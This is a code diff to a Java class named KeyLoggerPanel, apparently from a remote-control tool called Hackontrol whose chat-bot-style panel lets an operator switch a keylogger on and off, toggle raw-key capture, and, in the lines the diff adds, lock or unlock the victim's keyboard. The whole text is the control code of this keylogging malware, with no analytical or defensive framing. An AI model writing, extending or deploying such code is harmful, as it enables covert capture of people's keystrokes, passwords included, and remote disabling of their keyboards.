@@ -14,6 +14,8 @@ public class KeyLoggerPanel extends Panel {
 
 	private static final Button BUTTON_ENABLE          = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable",  "keyloggerEnable");
 	private static final Button BUTTON_DISABLE         = ButtonManager.staticButton(ButtonType.DANGER,  "Disable", "keyloggerDisable");
+	private static final Button BUTTON_LOCK            = ButtonManager.staticButton(ButtonType.SUCCESS, "Lock",    "keyloggerLock");
+	private static final Button BUTTON_UNLOCK          = ButtonManager.staticButton(ButtonType.DANGER,  "Unlock",  "keyloggerUnlock");
 
 	private static final Button BUTTON_RAW_KEY_ENABLE  = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable",  "keyloggerRawKeyEnable");
 	private static final Button BUTTON_RAW_KEY_DISABLE = ButtonManager.staticButton(ButtonType.DANGER,  "Disable", "keyloggerRawKeyDisable");
@@ -25,10 +27,12 @@ public class KeyLoggerPanel extends Panel {
 
 	@Override
 	public void registeration() {
-		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_ENABLE,          context -> this.buttonEnable(context, true));
-		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_DISABLE,         context -> this.buttonEnable(context, false));
-		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_RAW_KEY_ENABLE,  context -> this.buttonRawKeyEnable(context, true));
-		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_RAW_KEY_DISABLE, context -> this.buttonRawKeyEnable(context, false));
+		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_ENABLE,          context -> this.action(context, "KeyLogger is already enabled",    KeyboardHandler.Enable,      () -> KeyboardHandler.Enable = true));
+		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_DISABLE,         context -> this.action(context, "KeyLogger is already disabled",   !KeyboardHandler.Enable,     () -> KeyboardHandler.Enable = false));
+		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_LOCK,            context -> this.action(context, "Keyboard is already locked",      KeyboardHandler.Block,       () -> KeyboardHandler.Block = true));
+		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_UNLOCK,          context -> this.action(context, "Keyboard is already unlocked",    !KeyboardHandler.Block,      () -> KeyboardHandler.Block = false));
+		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_RAW_KEY_ENABLE,  context -> this.action(context, "Raw-key mode is already enabled", KeyboardHandler.RawKeyMode,  () -> KeyboardHandler.RawKeyMode = true));
+		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_RAW_KEY_DISABLE, context -> this.action(context, "Text mode is already enabled",    !KeyboardHandler.RawKeyMode, () -> KeyboardHandler.RawKeyMode = false));
 	}
 
 	@Override
@@ -37,6 +41,7 @@ public class KeyLoggerPanel extends Panel {
 				ControlWidget.newBuilder()
 				.text("**KeyLogger**")
 				.actionRow(KeyLoggerPanel.BUTTON_ENABLE, KeyLoggerPanel.BUTTON_DISABLE)
+				.actionRow(KeyLoggerPanel.BUTTON_LOCK, KeyLoggerPanel.BUTTON_UNLOCK)
 				.build(),
 				ControlWidget.newBuilder()
 				.text("**Raw-Key Mode**")
@@ -45,23 +50,13 @@ public class KeyLoggerPanel extends Panel {
 		};
 	}
 
-	private void buttonEnable(ButtonContext context, boolean enable) {
-		if(KeyboardHandler.Enable == enable) {
-			HackontrolMessage.boldDeletable(context.reply(), "KeyLogger is already " + (enable ? "enabled" : "disabled"));
+	private void action(ButtonContext context, String text, boolean already, Runnable setter) {
+		if(already) {
+			HackontrolMessage.boldDeletable(context.reply(), text);
 			return;
 		}
 
-		KeyboardHandler.Enable = enable;
-		context.deferEdit().queue();
-	}
-
-	private void buttonRawKeyEnable(ButtonContext context, boolean enable) {
-		if(KeyboardHandler.RawKeyMode == enable) {
-			HackontrolMessage.boldDeletable(context.reply(), (enable ? "Raw-key" : "Text") + " mode is already enabled");
-			return;
-		}
-
-		KeyboardHandler.RawKeyMode = enable;
+		setter.run();
 		context.deferEdit().queue();
 	}
 }
